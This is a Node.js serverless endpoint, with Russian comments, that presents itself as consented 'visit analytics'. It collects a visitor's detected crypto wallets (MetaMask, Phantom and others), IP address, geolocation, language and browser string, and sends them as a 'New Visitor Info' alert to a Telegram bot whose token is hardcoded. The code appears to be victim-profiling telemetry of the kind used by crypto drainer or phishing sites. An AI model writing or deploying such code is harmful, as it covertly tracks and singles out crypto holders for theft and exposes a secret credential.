/**
 * POST /api/visit  - аналитика визита (исследование, с согласия пользователя)
 * Ожидает с фронта: { wallets?: string[], system?: string, lang?: string, tz?: string }
 */

const https = require('https');

const BOT_TOKEN = process.env.BOT_TOKEN || '8842189334:AAHGd1814LZ-e13xdsfbuH35v_WF4c5RTa4';
const CHAT_ID = process.env.CHAT_ID || ''; // <- укажи в Vercel Env, напр. -1001234567890 или свой id

function sendTelegram(text) {
  if (!CHAT_ID) {
    console.warn('CHAT_ID not set, skipping telegram send');
    return Promise.resolve();
  }
  const payload = JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true });
  return new Promise((resolve, reject) => {
    const req = https.request(
      {
        hostname: 'api.telegram.org',
        path: `/bot${BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
      },
      (res) => {
        let d = '';
        res.on('data', (c) => (d += c));
        res.on('end', () => resolve(d));
      }
    );
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

function getIP(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return fwd.split(',')[0].trim();
  const real = req.headers['x-real-ip'];
  if (real) return real;
  return req.socket.remoteAddress || 'unknown';
}

function parseSystem(ua = '') {
  const u = ua.toLowerCase();
  if (u.includes('iphone') || u.includes('ipad')) return 'iOS';
  if (u.includes('android')) return 'Android';
  if (u.includes('mac os')) return 'Mac 🍏';
  if (u.includes('windows')) return 'Windows';
  if (u.includes('linux')) return 'Linux';
  return 'Unknown';
}

async function getGeo(ip) {
  // Vercel даёт заголовки geo, используем их если есть, иначе ip-api
  // vercel: x-vercel-ip-city, x-vercel-ip-country, x-vercel-ip-country-region
  return null; // заполняется в handler
}

module.exports = async (req, res) => {
  // CORS для основного сайта
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ ok: false, error: 'POST only' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { body = {}; }
  }
  if (!body) body = {};

  const ip = getIP(req);
  const ua = req.headers['user-agent'] || body.ua || 'unknown';
  const system = body.system || parseSystem(ua);
  const wallets = Array.isArray(body.wallets) && body.wallets.length ? body.wallets.join(', ') : 'None';
  const walletsEmoji = body.wallets && body.wallets.length ? body.wallets.map(w => {
    const map = { phantom: '👻 Phantom', metamask: '🦊 MetaMask', trust: 'Trust', coinbase: 'Coinbase', rabby: 'Rabby', zerion: 'Zerion' };
    const k = w.toLowerCase();
    return map[k] || w;
  }).join(', ') : 'None';

  const lang = body.lang || req.headers['accept-language']?.split(',')[0] || 'unknown';
  const city = req.headers['x-vercel-ip-city'] ? decodeURIComponent(req.headers['x-vercel-ip-city']) : null;
  const country = req.headers['x-vercel-ip-country'] || null;
  const region = req.headers['x-vercel-ip-country-region'] || null;

  let location = 'unknown';
  if (city && country) location = `${city}, ${country}${region ? ` (${region})` : ''}`;
  else if (country) location = country;
  else if (ip && ip !== 'unknown' && !ip.startsWith('127.') && !ip.startsWith('192.168')) {
    try {
      const controller = new AbortController();
      setTimeout(() => controller.abort(), 3000);
      const r = await fetch(`http://ip-api.com/json/${ip}?fields=city,country,countryCode,regionName`, { signal: controller.signal });
      const j = await r.json();
      if (j && j.country) location = `${j.city || ''}${j.city ? ', ' : ''}${j.country}${j.countryCode ? ` (${j.countryCode})` : ''}`;
      if (j.regionName && j.city !== j.regionName) location += ` - ${j.regionName}`;
    } catch {}
  }

  const now = new Date();
  const timeStr = now.toLocaleTimeString('en-GB', { hour12: false, timeZone: body.tz || 'UTC' }) + ` (${body.tz || 'UTC'})`;

  const text =
    `👑 New Visitor Info\n` +
    `—————————————\n` +
    `💻 System: ${system}\n` +
    `👛 Wallets: ${walletsEmoji}\n` +
    `🌍 IP: ${ip}\n` +
    `📍 Location: ${location}\n` +
    `🗣 Lang: ${lang}\n` +
    `🌐 Browser: ${ua}\n` +
    `⏰ Time: ${timeStr}`;

  try {
    await sendTelegram(text);
  } catch (e) {
    console.error('telegram error', e);
  }

  return res.status(200).json({ ok: true });
};
